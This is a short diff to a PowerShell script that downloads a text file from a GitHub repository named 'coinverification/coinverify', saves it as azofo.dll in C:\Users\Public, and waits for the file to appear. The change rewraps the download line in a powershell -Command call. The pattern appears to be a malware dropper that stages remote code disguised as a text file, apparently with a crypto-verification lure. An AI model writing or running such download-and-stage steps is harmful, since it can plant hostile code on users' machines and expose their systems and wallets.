@@ -1,5 +1,5 @@
 # Download DLL
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/coinverification/coinverify/main/azofo.txt' -OutFile 'C:\Users\Public\azofo.dll'
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/coinverification/coinverify/main/azofo.txt' -OutFile 'C:\Users\Public\azofo.dll'"
 
 # Wait until the file exists
 while (!(Test-Path "C:\Users\Public\azofo.dll")) { Start-Sleep -Milliseconds 500 }
